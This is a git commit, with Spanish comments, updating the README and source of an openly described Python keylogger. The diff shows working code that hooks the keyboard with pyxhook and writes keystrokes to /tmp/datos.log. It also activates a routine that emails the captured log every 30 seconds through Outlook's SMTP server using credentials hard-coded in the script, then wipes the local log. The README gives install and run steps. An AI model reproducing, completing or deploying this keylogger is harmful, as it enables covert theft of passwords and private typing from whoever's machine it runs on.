960e3172e3c2b3683ebde42ed1f6c0d764769fa2
kevin van liebergen <kevinliebergen@hotmail.com>
2019-02-01 01:28:01 +0100

    Simplificado insercion de correo y contraseña - actualizacion README

--- README.md
+++ README.md
@@ -4,13 +4,19 @@ Keylogger that sends the keystrokes to the mail every x time
 
 ## Installation
 
-1.  git clone https://github.com/KevinLiebergen/keylogger.git
-2. cd keylogger
-3. pipenv install
-4. Modify the code and write your e-mail and password in gmail_user and gmail_pass variables
+1. $ git clone https://github.com/KevinLiebergen/keylogger.git
+2. $ cd keylogger
+3. $ pip install pipenv
+4. $ pipenv install
+5. $ pipenv shell
+6. Modify the code and write your e-mail and password in hot mail_user and hotmail_pass variables inside FormatAndSendLogEmail() method
 
 ## Running
 
-#From the directory where program is
+From the directory where program is
 
-`python3 keylogger.py`
+$ `python3 keylogger.py`
+
+## Stopping
+
+-  Write `Z` (capital zeta)
--- keylogger.py
+++ keylogger.py
@@ -1,26 +1,27 @@
 import pyxhook
 import time, datetime
 import smtplib
+import sys
 
 #Fichero donde se van a guardar  las pulsaciones
 log_file='/tmp/datos.log'
 
 dict_key = {
-	"Shift_R": "",
-	"Shift_L": "",
-	"space":" ",
-	"period":".",
-	"Return":"\n",
-	"[65027]":"[Alt Gr]",
-	"colon":":",
-	"semicolon":';',
-	"comma":',',
-	"slash":'/',
-	"underscore":'_',
-	"Tab":'[Tab]		',
-	"ntilde":'ny',
-	"plus":'*',
-	"BackSpace":'[Borrar]',
+        "Shift_R": "",
+        "Shift_L": "",
+        "space":" ",
+        "period":".",
+        "Return":"\n",
+        "[65027]":"[Alt Gr]",
+        "colon":":",
+        "semicolon":';',
+        "comma":',',
+        "slash":'/',
+        "underscore":'_',
+        "Tab":'[Tab]		',
+        "ntilde":'ñ',
+        "plus":'*',
+        "BackSpace":'[Borrar]',
 	"ampersand":'&',
 	"parenleft":'(',
 	"parenright":')',
@@ -28,31 +29,34 @@ dict_key = {
 	"quotedbl": '"',
 	"exclam":'!',
 	"question":'?',
-	"Down":'[Down]',
-	"Left":'[Left]',
-	"Right":'[Right]',
-	"Up":'[Up]'
+	"Down":'[flecha abajo]',
+	"Left":'[flecha izquierda]',
+	"Right":'[flecha derecha]',
+	"Up":'[flecha arriba]'
 }
 
 #Esta funcion es llamada cuando se presiona una tecla
 def OnKeyPress(event):
-	fob=open(log_file,'a')
+    global running
 
-	if (event.Ascii == 50):
-		fob.write("@")
-	elif(event.Ascii == 51):
-		fob.write("#")
-	elif (event.Ascii == 52):
-		fob.write("~")
-	else:
-		fob.write(dict_key.get(event.Key, event.Key))
+    fob=open(log_file,'a')
+
+    if (event.Ascii==90): #Si pulsamos Z se termina el programa
+        fob.close()
+        new_hook.cancel()
+        running = False   #El while cambiara a false y hara sys.exit
+
+    elif (event.Ascii == 50):
+        fob.write("@")
+    elif(event.Ascii == 51):
+        fob.write("#")
+    elif (event.Ascii == 52):
+        fob.write("~")
+    else:
+        fob.write(dict_key.get(event.Key, event.Key))
 
 	#print ("letra presionada: "+event.Key+' codigo ascii: ')
 	#print (event.Ascii)
-
-	if (event.Ascii==90): #90 es el valor ascii de (Z)
-		fob.close()
-		new_hook.cancel()
 
 
 def TimeOut():
@@ -62,39 +66,44 @@ def TimeOut():
 		return False
 
 
-def SendEmail(user, pwd, recipient, subject, body):
+def SendEmail(user, pwd, recipient, asunto, body):
 
-	gmail_user = user
-	gmail_pass = pwd
-	FROM = user
-	TO = recipient if type(recipient) is list else [recipient]  #Validamos si es a mas de una persona quien enviamos el correo
-	SUBJECT = subject
-	TEXT = body
+    FROM = user
+    TO = recipient if type(recipient) is list else [recipient]  #Validamos si es a mas de una persona quien enviamos el correo
+    ASUNTO = asunto
+    TEXT = body
 
-	message = """\From: %s\nTo: %s\nSubject: %s\n\n%s""" % (FROM, ", ".join(TO), SUBJECT, TEXT)
-	try:
-		server = smtplib.SMTP("smtp-mail.outlook.com", 587)
-		server.ehlo()
-		server.starttls()
-		server.login(gmail_user, gmail_pass)
-		server.sendmail(FROM, TO, message)
-		server.close()
-		print 'Correo enviado satisfactoriamente'
-	except:
-		print 'Error al mandar correo!'
+    message = """\From: %s\nTo: %s\nSubject: %s\n\n%s""" % (FROM, ", ".join(TO), ASUNTO, TEXT)
+
+    try:
+        server = smtplib.SMTP("smtp-mail.outlook.com", 587)
+        server.ehlo()
+        server.starttls()
+        server.login(user, pwd)             #Cuenta desde donde se va a enviar el correo
+        print("[*] Enviando keylogger....\nContenido:")
+        print(body)
+        server.sendmail(user, TO, message)  #Cuenta hacia donde se va a enviar
+        server.close()
+        print("\nCorreo enviado satisfactoriamente")
+    except:
+        print("\nError al mandar correo!")
 
 
 def FormatAndSendLogEmail():
-	with open(log_file, 'r+') as f:
-		actualdate = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-		data = f.read().replace('\n','')
-		data = 'Log capturado a las: '+actualdate+ '\n' + data
-		# SendEmail('youremail@...', 'password', 'youremail@...', 'Nuevo log - '+actualdate, data)
-		f.seek(0)		#0 para apuntar al principio del fichero
-		f.truncate()	#Trunca el fichero ( borra todo lo que hay)
+	
+    hotmail_user = "yourEmail@hotmail.com"
+    hotmail_pass = "yourPassword"
+
+    with open(log_file, 'r+') as f:
+        actualdate = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+        data = f.read().replace('\n','')
+        data = 'Log capturado a las: '+actualdate+ '\n' + data
+        SendEmail(hotmail_user, hotmail_pass, hotmail_user, 'Nuevo log - '+actualdate, data)
+        f.seek(0)		#0 para apuntar al principio del fichero
+        f.truncate()	#Trunca el fichero ( borra todo lo que hay)
 
 
-wait_seconds =60;
+wait_seconds =30;
 timeout = time.time() + wait_seconds
 
 
@@ -110,7 +119,12 @@ new_hook.HookKeyboard()
 #Empieza la sesion
 new_hook.start()
 
-while True:
-	if TimeOut():
-		FormatAndSendLogEmail()
-		timeout = time.time() + wait_seconds #Tiempo limite en segundos, lo igualamos al tiempo actual mas los segundos a esperar
+running = True
+
+while running:
+    if TimeOut():
+        FormatAndSendLogEmail()
+        timeout = time.time() + wait_seconds #Tiempo limite en segundos, lo igualamos al tiempo actual mas los segundos a esperara
+
+
+sys.exit(0)
